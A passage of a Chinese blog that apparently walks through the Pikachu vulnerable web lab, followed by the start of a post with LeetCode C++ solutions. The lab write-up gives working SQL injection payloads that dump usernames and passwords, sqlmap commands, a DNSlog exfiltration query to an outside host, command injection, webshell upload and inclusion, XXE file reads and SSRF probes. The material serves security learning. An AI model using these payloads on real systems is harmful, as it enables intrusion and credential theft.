/>\n\n无法进行crsf攻击，因为每次的token都是一次性生成的，当每次提交表单时，这个`Token`值就会传到后台与`SESSION`中的`Token`进行比较，若不相等，此次表单则提交失败。所以黑客由于不能得知用户当前的`Token`值，从而无法进行CSRF攻击。\n\n#### CSRF防范\n\n- 对敏感信息的操作增加安全的token；\n- 对敏感信息的操作增加安全的验证码；\n- 对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。\n\n### **SQL-Inject**\n\n#### 数字型注入（post）\n\n可以看到是通过单选框选择的id，所以用burpsuite抓包测试，通过检验发现是数字型\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208083917080.png\" alt=\"image-20231208083917080\" style=\"zoom: 25%;\" />\n\n构造如下代码获取返回数据的长度，数据库，表，数据\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208084055778.png\" alt=\"image-20231208084055778\" style=\"zoom: 30%;\" />   <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208084125041.png\" alt=\"image-20231208084125041\" style=\"zoom: 33%;\" />      <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208084151070.png\" alt=\"image-20231208084151070\" style=\"zoom: 33%;\" />                 <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208084321677.png\" alt=\"image-20231208084321677\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208084431089.png\" alt=\"image-20231208084431089\" style=\"zoom:25%;\" /> <img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208084636244.png\" alt=\"image-20231208084636244\" style=\"zoom:25%;\" />\n\n#### 字符型注入（POST）\n\n该板块和数字型区别就是该板块需要闭合单引号，并且对后面添加注释，构造语句如下\n\n```sql\n-1' union select group_concat(username),group_concat(password) from users where id=1 or id =2#\n```\n\n结果如下\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208085336753.png\" alt=\"image-20231208085336753\" style=\"zoom:50%;\" />\n\n#### 搜索型注入\n\n模糊查询的语句一般如下\n\n```sql\nselect username from user where username like '%{$username}%';\n```\n\n所以需要将%闭合才能执行我们的查询\n\n爆破查询\n\n```sql\n-1%' union select 1,2,concat_ws('-',username,password) from users #\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208090040649.png\" alt=\"image-20231208090040649\" style=\"zoom:25%;\" />\n\n```tex\n这段 SQL 查询的含义是从名为 users 的表中选择三列数据，并在第三列中使用 CONCAT_WS 函数连接 username 列和 password 列，并使用横杠 - 作为分隔符。这是一种常见的方式，用于在 SQL 注入攻击中尝试获取用户凭证信息的测试。\n\n具体来说：\n\nselect 1,2,concat_ws('-',username,password) from users: 选择了三列数据，第一列是常数 1，第二列是常数 2，第三列使用 CONCAT_WS 将 username 和 password 以横杠分隔的形式连接在一起。\n```\n\n#### xx型注入\n\n尝试字符型报错如下,1\"是我们构造的，\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208101757511.png\" alt=\"image-20231208101757511\" style=\"zoom: 33%;\" />\n\n猜测sql查询语句如下\n\n```sql\nselect username from user where username=('$name');\n```\n\n构造语句如下\n\n```sql\n1') union select concat_ws('-',username, password),2 from users #\n```\n\n结果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208102737831.png\" alt=\"image-20231208102737831\" style=\"zoom:33%;\" />\n\n#### \"insert/update\"注入\n\n##### insert\n\n首先构造如下：```flower','123','123','123','123','123')#```\n\n发现提示注册成功，说明对应的sql语句应该是 ```$query=\"insert into ember(username,pw,sex,phonenum,email,address) values('$username','$password','$sex','$phonenum','$email','add')\";```\n\n但是注册成功并不会显示什么，就算我们在这里构造了select语句也没办法看到返回，但是当我们构造的语句使得sql语句无法执行时会出现报错\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208105758494.png\" alt=\"image-20231208105758494\" style=\"zoom:33%;\" />\n\n所以只能考虑将我们要输出的内容输出到报错中，使用报错注入，可以使用\n\n###### updatexml\n\n**updatexml()**构造如下sql语句\n\n```sql\nflower','123','123','123','123','123' and updatexml(1,concat('~',database()),1)) #\n```\n\n**疑惑点：**\n\n+ 为什么这样可以返回数据库：`select count(*) from users group by floor(rand(0)*2) and updatexml(1,concat('~',database()),1)` ，但是这样不行：`updatexml(1,concat('~',database()),1)` \n\n  原因：updatexml只是一个函数，不能直接当作sql语句使用，也就是相当于floor(rand(0)*2)不能当作一个sql语句执行\n\n+ 为什么该处不能使用以下sql语句：```flower','123','123','123','123','123' )and updatexml(1,concat('~',database()),1)#```\n\n  原因：正确的sql语句的含义是在insert中调用了updatexml函数，返回报错，但是下面的sql语句将上面的sql语句闭合之后再and一个表达式，首先insert不能and，并且updatexml只是一个函数，只能调用，不能当作sql语句\n\n最后构造出的sql语句为：\n\n```sql\nflower','123','123','123','123','123' and updatexml(1,concat('~',(select group_concat(concat_ws(\"-\",username,password)) from users)),1)) #\n```\n\n如图是返回结果，但是似乎返回结果有长度限制，只能看到admin的用户名和密码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208154603027.png\" alt=\"image-20231208154603027\" style=\"zoom:33%;\" />\n\n###### extractvalue\n\n类似的还有**extractvalue()**函数，构造如下sql语句\n\n```sql\nflower','123','123','123','123','123' and extractvalue(1,concat('~',(select group_concat(concat_ws(\"-\",username,password)) from users)))) #\n```\n\n###### floor\n\n构造如下sql语句\n\n```sql\nflower','123','123','123','123','123' and (select count(*) from information_schema.tables group by concat('~',database(),'~',floor(rand(0)*2))))#  \n```\n\ndatabase()就是我们可以构造的payload\n\n最后构造如下\n\n```\nflower','123','123','123','123','123' and (select count(*) from information_schema.tables group by concat('~',(select group_concat(concat_ws(\"-\",username,password)) from users),'~',floor(rand(0)*2))))#  \n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208160528347.png\" alt=\"image-20231208160528347\" style=\"zoom:50%;\" />\n\n##### update\n\n通过测试修改信息界面构造如下payload可以成功修改信息：\n\n```sql\n12',phonenum='1',address='1',email='1' where id=2#\n```\n\n猜测查询的sql语句应该是将输入的各参数进行拼接，最后加上where语句，还是一样的方式，再语句中使用我们的报错注入\n\n###### updatexml\n\n```sql\n12',phonenum='1',address='1',email='1' where id=2 and updatexml(1,concat(\"~\",database(),\"~\"),1)#\n```\n\n成功返回\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208161545861.png\" alt=\"image-20231208161545861\" style=\"zoom:33%;\" />\n\n如图所示，构造以下sql语句获取用户名和密码\n\n```\n12',phonenum='1',address='1',email='1' where id=2 and updatexml(1,concat(\"~\",(select group_concat(concat_ws(\"-\",username,password)) from users),\"~\"),1)#\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208161804025.png\" alt=\"image-20231208161804025\" style=\"zoom:50%;\" />\n\n###### extractvalue\n\n构造如下sql语句\n\n```sql\n12',phonenum='1',address='1',email='1' where id=2 and extractvalue(1,concat(\"~\",(select group_concat(concat_ws(\"-\",username,password)) from users),\"~\"))#\t\t\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208161839153.png\" alt=\"image-20231208161839153\" style=\"zoom:33%;\" />\n\n###### floor\n\n构造如下sql语句\n\n```sql\n12',phonenum='1',address='1',email='1' where id=2 and (select count(*) from information_schema.tables group by concat((select group_concat(concat_ws(\"-\",username,password)) from users),floor(rand(0)*2)))#\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208162357044.png\" alt=\"image-20231208162357044\" style=\"zoom:50%;\" />\n\n#### delete注入\n\n通过测试，可以提交两份相同内容的留言板，但是删除的时候只会删除选中的，相同的内容不会被删除，说明不是通过内容删除帖子，猜测是通过id，同时尝试上传帖子内容：`真好')#`，发现删除还是很正常，说明应该没有通过内容查找id\n\n查看前端代码，发现删除按钮绑定了一个url，包含了id的信息，说明是通过id删除的内容\n\n![image-20231208163053645](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208163053645.png)\n\n猜测删除的语句为\n\n```sql\ndelete from xxx where id = '$id'\n```\n\n所以我们可以通过构造url传id，将id构造成能返回私密信息的payload\n\n流程就是判断是否是字符型，通过实验发现通过报错注入可以成功，将构造好的报错注入sql语句通过url编码之后放到id后面，然后构造sql语句如下\n\n```url\nid=63%20and%20updatexml(1%2Cconcat(%27%2d%27%2C(select%20group_concat(password)%20from%20users))%2C1)\n```\n\n如图所示，获取成功\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208194108965.png\" alt=\"image-20231208194108965\" style=\"zoom: 25%;\" />\n\n#### \"http header\"注入\n\n如图所示是输入用户名密码之后的界面，说明前端在发送请求包给后端的时候，后端会获取前端请求头中的这些信息，并显示在界面上，猜测应该是获取到数据之后存在了数据库中，所以我们可以通过构造后端获取的参数的payload，使得后端能够执行我们所要执行的代码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208201644882.png\" alt=\"image-20231208201644882\" style=\"zoom:25%;\" />\n\n此处选择更改user agent，应该是获取之后insert到表中，但是不知道具体顺序，所以我们还是采取报错查询\n\n构造user agent如下，但是用注释符一直报错，查看源码，如图所示，后面应该用括号闭合\n\n![image-20231208203421758](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208203421758.png)\n\n```sqlite\n1' and updatexml(1, concat(0x7e, (select group_concat(concat_ws('-',username,password)) from users ),0x7e), 1),1,1 )#\n```\n\n这里有点小坑，发现能报错注入之后，尝试获取数据库名称发现很好获取，但是获取用户名密码显示userid不符合格式，通过查看源码发现userid只有在验证用户登录之后才会正确赋值，所以在构造payload之前需要先设置好cookie为登录态\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208204021238.png\" alt=\"image-20231208204021238\" style=\"zoom:25%;\" />\n\n#### 盲注（base on boolian）\n\n盲注可以在and后面添加判断条件，首先判断数据库名长度，然后是每个字符是什么\n\n此处采用sqlmap工具进行盲注，但是通过测试发现该方法并不行，尝试写脚本解决（待做）\n\n```\n#查询数据库【pikachu】 \npython sqlmap.py -u \"http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\"  --dbs\n\n#获取数据库中的表【httpinfo,member,message,users,xssblind】 \npython sqlmap.py -u \"http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D pikachu --tables --batch --threads 10 \n\n#获取表中的字段名【...user,password,...】 \npython sqlmap.py -u \"http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\"  -D pikachu -T users --columns --batch --threads 10 \n\n#获取字段信息\npython sqlmap.py -u \"http://127.0.0.1/pikachu-master/vul/sqli/sqli_blind_b.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" -D pikachu -T users -C username,password --dump --batch --threads 10\n```\n\n除了sqlmap，通过学习，发现可以通过dnslog注入，构造语句如下\n\n```sql\nallen' and if((select load_file(concat('//',(select database()),'.38rbm5.ceye.io'))),1,0);#\n```\n\n能发现发起了请求，但是没看到database内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209154950331.png\" alt=\"image-20231209154950331\" style=\"zoom:33%;\" />\n\n应该是mysql设置的问题，dnslog注入要求数据库有读写权限即：secure_file_priv=“”\n\n#### 宽字节注入\n\n通过测试发现输入allen' #还是显示没有此人，应该是引号被转义了，所以我们构造宽字节，使得后端为了是我们引号转义添加的\\能够和%df两个字节通过编码构成一个整的汉字，从而使得引号不被转义，构造如下\n\n```sql\nallen%df' union select 1,group_concat(username,0x3a,password) from users\n```\n\n如图获取了用户名和密码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209160727966.png\" alt=\"image-20231209160727966\" style=\"zoom:33%;\" />\n\n### RCE\n\n#### exec \"ping\"\n\n该漏洞即为ping的时候直接将输入的ip地址拼接到ping后面没有进行过滤，导致后面可以拼接其他命令，直接输入以下内容即可输出当前目录\n\n```\n127.0.0.1 && dir\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209161504390.png\" alt=\"image-20231209161504390\" style=\"zoom:25%;\" />\n\n#### exec \"eval\"\n\n如图所示为源码的内容，如果输入的字符无法被执行就输出下面的文本内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209162249096.png\" alt=\"image-20231209162249096\" style=\"zoom: 33%;\" />\n\n所以输入的字符只要是能执行就可以被成功执行，比如输入：```system(\"dir\");```，如图所示是执行结果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209162419095.png\" alt=\"image-20231209162419095\" style=\"zoom:33%;\" />\n\n### File Inclusion\n\n#### File Inclusion(local)\n\n通过burp抓取点击提交时的请求包，通过以下两份内容可以得知后端根据传递回来的文件名找取对应的运动员的简介和照片\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209162721541.png\" alt=\"image-20231209162721541\" style=\"zoom: 50%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209162728117.png\" alt=\"image-20231209162728117\" style=\"zoom: 50%;\" />\n\n通过加引号可以获取上一目录\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209163402116.png\" alt=\"image-20231209163402116\" style=\"zoom:33%;\" />\n\n#### File inclusion(remote)\n\n该漏洞是由于include在包含一个文件的时候，如果该文件的内容是php格式的，即使文件后缀是txt，也会当作php执行，我们可以构造一个txt文件，文件内容是在当前目录下生成一个一句话木马的文件，使得后端在include这个文件之后能够字典在当前目录下生成一个一句话木马\n\n该txt文件作者已经帮我们构造好了\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209170306135.png\" alt=\"image-20231209170306135\" style=\"zoom:25%;\" />\n\n通过将这段url传递给include里的内容便可生成一个一句话木马的php文件，如图所示，系统自动帮我们清除掉了，但是这个一句话木马应该是能生效的\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209170417039.png\" alt=\"image-20231209170417039\" style=\"zoom: 50%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209170427761.png\" alt=\"image-20231209170427761\" style=\"zoom:50%;\" />\n\n### Unsafe Filedownload\n\n#### Unsafe Filedownload\n\n如图所示，成功获取到我们想获取的文件内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209170826773.png\" alt=\"image-20231209170826773\" style=\"zoom:25%;\" />\n\n### Unsafe Fileupload\n\n#### client check\n\n如图所示是在前端检验，先将php文件更改为png文件，然后在传包的时候再更改为php文件，直接用burp发送请求包即可\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209171030032.png\" alt=\"image-20231209171030032\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209171602746.png\" alt=\"image-20231209171602746\" style=\"zoom: 50%;\" />\n\n如图所示，系统又自动给我删了，说明上传成功了，重新上传了phpInfo,如图所示，能正常展示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209171638525.png\" alt=\"image-20231209171638525\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209171849749.png\" alt=\"image-20231209171849749\" style=\"zoom:33%;\" />\n\n#### MIME type\n\n还是用上述一样的方式还是可以绕过\n\n#### getimagesize()\n\n该函数会在后端对上传的文件名的后缀进行检查，只能是规定之内的，该漏洞的利用要和前面的文件包含漏洞一起使用，也就是构造图片木马，将图片和一句话木马合并成一个图片，然后将该图片上传到服务器上，再通过文件包含漏洞包含该文件，就可以执行我们的一句话木马，攻击就能成功\n\n将我们构造的图片木马进行上传，通过测试，如果文件就是由php文件更改后缀名上传的仍然会被检测出来，所以需要用真实的照片和文件进行合并上传，然后通过文件包含漏洞包含该文件，如图是攻击过程\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209173053741.png\" alt=\"image-20231209173053741\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209173337263.png\" alt=\"image-20231209173337263\" style=\"zoom: 25%;\" />\n\n### Over Permission\n\n#### 水平越权\n\n在登录之后查看个人信息的url使用了get请求，只发送了username，可以通过更改username就可以查看其他人的信息，如图所示，即使当前登录者是lili，还是可以通过更改username修改信息\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209173847365.png\" alt=\"image-20231209173847365\" style=\"zoom:33%;\" />\n\n#### 垂直越权\n\n如图所示是admin删除人时的url，尝试通过普通用户访问该url\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209174237525.png\" alt=\"image-20231209174237525\" style=\"zoom: 50%;\" />\n\n访问前访问后没有区别，说明后端应该在删除人时设置了权限识别，查看后端源代码果然在删除时检查了session\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209174553862.png\" alt=\"image-20231209174553862\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209175011022.png\" alt=\"image-20231209175011022\" style=\"zoom:33%;\" />\n\n但是通过查看源代码发现增加信息是没有检查session的，说明增加人的信息是可以通过普通权限做的\n\n### ../../\n\n#### 目录遍历\n\n还是构造访问刚才的图片木马\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209180210007.png\" alt=\"image-20231209180210007\" style=\"zoom:33%;\" />\n\n### 敏感信息泄露\n\n#### IcanseeyourABC\n\n用户信息出现在前端源代码中\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209180532763.png\" alt=\"image-20231209180532763\" style=\"zoom:50%;\" />\n\n### PHP反序列化\n\n#### PHP反序列化漏洞\n\n查看源代码可以看到，将输入的php反序列化之后会输出变量test的内容，我们可以构造test内容为敏感信息，这样就能获取用户的敏感信息\n\n构造如下：\n\n```\nO:1:\"S\":1:{s:4:\"test\";s:39:\"<script>alert(document.cookie)</script>\";}\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209181653991.png\" alt=\"image-20231209181653991\" style=\"zoom: 33%;\" />\n\n### XXE\n\n#### XXE漏洞\n\n漏洞原理应该就是构造xml上传到服务器使得服务器解析之后执行返回结果，漏洞原理就是通过外部引用，访问服务器内部文件，并显示在前端界面，如下面所示，外部引用中外部DTD的URI可以是服务器敏感文件的目录，就可以敏感文件的信息赋值给我们的根元素\n\n```\n① 内部申明DTD格式\n<!DOCTYPE 根元素 [元素申明]>\n\n② 外部引用DTD格式\n<!DOCTYPE 根元素 SYSTEM \"外部DTD的URI\">\n\n③ 引用公共DTD格式\n<!DOCTYPE 根元素 PUBLIC \"DTD标识名\" \"公共DTD的URI\">\n```\n\n比如此处可以使用如下构造方式\n\n```\n<?xml version=\"1.0\"  encoding=\"UTF-8\"?>\n<!DOCTYPE name [\n<!ENTITY f SYSTEM \"file:///D://phpstudy_pro//WWW//pikachu//vul//unsafeupload//uploads//2023//12//09//158078657433f03558f337815476.txt\">]>\n<name>&f;</name>\n```\n\n便获取到了文件内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209183749124.png\" alt=\"image-20231209183749124\" style=\"zoom:33%;\" />\n\n### URL重定向\n\n#### 不安全的URL跳转\n\nurl重定向导致钓鱼，就是设置一个按钮，该按钮链接到钓鱼网站\n\n### SSRF\n\n#### SSRF(curl)\n\n如图所示，再url后面可以跟上我们上传的恶意文件并执行，我访问了一个上传的php文件，成功执行\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209190208590.png\" alt=\"image-20231209190208590\" style=\"zoom:33%;\" />\n\nPHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。\n\nlibcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。\n\ncurl函数参考：https://www.runoob.com/php/php-ref-curl.html\n\n```\n//file协议读取\n?url=file:///D://jwt.txt\n\n//gopher协议\n//基本协议格式：URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流\n?url=gopher://119.23.243.154:22\n\n//dict协议\n?url=dict://119.23.243.154:22\n\n//http/https协议\n?url=http://x.x.x.x/\n?url=https://x.x.x.x/\n\n//探测内网其他主机的端口\n?url=http://x.x.x.x:port\n```\n\n| **file协议**                                                 | **http/https协议**                                           | **端口**                                                     |\n| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| **![img](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/20200715182340.png)** | **![img](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/20200715182343.png)** | **![img](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/20200715182346.png)** |\n\n**源码分析**\n\n```php\nif(isset($_GET['url']) && $_GET['url'] != null){\n    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF\n    $URL = $_GET['url'];\n    $CH = curl_init($URL);\n    curl_setopt($CH, CURLOPT_HEADER, FALSE);\n    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);\n    $RES = curl_exec($CH);\n    curl_close($CH) ;\n    echo $RES;\n}\n```\n\n前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端，并且没做任何过滤或限制。从而导致了用户可能可以通过这个漏洞进行一些内网服务探测等等\n\n参考：[SSRF原理实战及修复方式](https://segmentfault.com/a/1190000021810264)\n\n#### SSRF(file_get_content)\n\n一样的构造方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231209190914600.png\" alt=\"image-20231209190914600\" style=\"zoom:25%;\" />\n\nfile_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。\n\n函数语法: file_get_contents(path,include_path,context,start,max_length)\n\n| 参数         | 描述                                                         |\n| :----------- | :----------------------------------------------------------- |\n| path         | 必需。规定要读取的文件。                                     |\n| include_path | 可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 ‘1’。 |\n| context      | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 NULL，则忽略。 |\n| start        | 可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 中新增的。 |\n| max_length   | 可选。规定读取的字节数。该参数是 PHP 5.1 中新增的。          |\n\n```\n//file协议读取\n?file=file:///D://jwt.txt\n\n//读取php源码\n?file=php://filter/read=convert.base64-encode/resource=ssrf.php\n\n//内网其它主机请求\n?file=http://x.x.x.x/xx.index\n\n//探测内网其他主机的端口\n?file=http://x.x.x.x:port\n    \n```\n\n源码分析\n\n```php\nif(isset($_GET['file']) && $_GET['file'] !=null){\n    $filename = $_GET['file'];\n    $str = file_get_contents($filename);\n    echo $str;\n}\n```\n\n直接访问获取到的文件\n","tags":["php"],"categories":["安全"]},{"title":"leetcode面试100题","url":"/post/4d65bd11.html","content":"\n111\n\n<!--more-->\n\n## 合并两个有序数组（简单）\n\n### 题目描述\n\n给你两个按 **非递减顺序** 排列的整数数组 `nums1` 和 `nums2`，另有两个整数 `m` 和 `n` ，分别表示 `nums1` 和 `nums2` 中的元素数目。\n\n请你 **合并** `nums2` 到 `nums1` 中，使合并后的数组同样按 **非递减顺序** 排列。\n\n**注意：**最终，合并后数组不应由函数返回，而是存储在数组 `nums1` 中。为了应对这种情况，`nums1` 的初始长度为 `m + n`，其中前 `m` 个元素表示应合并的元素，后 `n` 个元素为 `0` ，应忽略。`nums2` 的长度为 `n` 。\n\n**示例 1：**\n\n```\n输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3\n输出：[1,2,2,3,5,6]\n解释：需要合并 [1,2,3] 和 [2,5,6] 。\n合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。\n```\n\n### 思路\n\n从后往前存数组的值，因为从前往后存会改变nums[1]前面没有用的值，所以尝试将较大值存在Nums[1]后面\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    void merge(vector<int>& nums1, int m, vector<int>& nums2, int n) {\n        int end=(m--)+(n--)-1;\n        while(end>=0&&end!=m)\n            nums1[end--]=(m<0||(n>=0&&nums2[n]>=nums1[m]))?nums2[n--]:nums1[m--];\n    }\n};\n```\n\n## 填充每个节点的下一个右侧节点指针Ⅱ（中等）\n\n### 题目描述\n\n给定一个二叉树：\n\n```\nstruct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n```\n\n填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 `NULL` 。\n\n初始状态下，所有 next 指针都被设置为 `NULL` 。\n\n**示例 1：**\n\n![img](2023-9-21%E4%BB%8A%E6%97%A5%E7%BB%83%E4%B9%A0.assets/117_sample.png)\n\n```\n输入：root = [1,2,3,4,5,null,7]\n输出：[1,#,2,3,#,4,5,7,#]\n解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。序列化输出按层序遍历顺序（由 next 指针连接），'#' 表示每层的末尾。\n```\n\n### 思路\n\nBFS，但是不用额外的空间，比如遍历了第二层所有节点并连接了，只需要直到第二层的首节点，便可通过next找到下一个节点\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    Node* connect(Node* root) {\n        if(root==NULL)return root;\n        Node*ans=root;\n        Node* line;\n        Node* line2;\n        root->next=NULL;\n        while(root){\n            line=NULL;\n            line2=NULL;\n            while(root){\n                if(root->left!=NULL){\n                    if(line==NULL){\n                        line=root->left;\n                        line2=line;\n                    }else{\n                        line->next=root->left;\n                        line=line->next;\n                    }\n                }\n                if(root->right!=NULL){\n                    if(line==NULL){\n                        line=root->right;\n                        line2=line;\n                    }else{\n                        line->next=root->right;\n                        line=line->next;\n                    }\n                }\n                root=root->next;\n            }\n            if(line)line->next=NULL;\n            root=line2;\n        }\n        return ans;\n    }\n};\n```\n\n## 移除元素（简单）\n\n### 题目描述\n\n给你一个数组 `nums` 和一个值 `val`，你需要 **[原地](https://baike.baidu.com/item/原地算法)** 移除所有数值等于 `val` 的元素，并返回移除后数组的新长度。\n\n不要使用额外的数组空间，你必须仅使用 `O(1)` 额外空间并 **[原地 ](https://baike.baidu.com/item/原地算法)修改输入数组**。\n\n元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。\n\n**说明:**\n\n为什么返回数值是整数，但输出的答案是数组呢?\n\n请注意，输入数组是以**「引用」**方式传递的，这意味着在函数里修改输入数组对于调用者是可见的。\n\n你可以想象内部操作如下:\n\n```\n// nums 是以“引用”方式传递的。也就是说，不对实参作任何拷贝\nint len = removeElement(nums, val);\n\n// 在函数里修改输入数组对于调用者是可见的。\n// 根据你的函数返回的长度, 它会打印出数组中 该长度范围内 的所有元素。\nfor (int i = 0; i < len; i++) {\n    print(nums[i]);\n}\n```\n\n### 思路\n\n双指针，因为要忽略值为val的元素，所以用两个指针，i指向忽略后的下标，j指向正常下标，当遇到值为val时j继续往前，i就不动\n\n### 代码\n\n```c++\nclass Solution {\npublic:\n    int removeElement(vector<int>& nums, int val) {\n        int i=0;\n        int j=0;\n        while(j<nums.size()){\n            if(nums[j]!=val)swap(nums[j],nums[i++]);\n            j++;\n        }\n        return i;\n    }\n};\n```\n\n## 简化路径（中等）\n\n### 题目描述\n\n给你一个字符串 `path` ，表示指向某一文件或目录的 Unix 风格 **绝对路径** （以 `'/'` 开头），请你将其转化为更加简洁的规范路径。\n\n在 Unix 风格的文件系统中，一个点（`.`）表示当前目录本身；此外，两个点 （`..`） 表示将目录切换到上一级（指向父目录）；两者都可以是复杂相对路径的组成部分。任意多个连续的斜杠（即，`'//'`）都被视为单个斜杠 `'/'` 。 对于此问题，任何其他格式的点（例如，`'...'`）均被视为文件/目录名称。\n\n请注意，返回的 **规范路径** 必须遵循下述格式：\n\n- 始终以斜杠 `'/'` 开头。\n- 两个目录名之间必须只有一个斜杠 `'/'` 。\n- 最后一个目录名（如果存在）**不能** 以 `'/'` 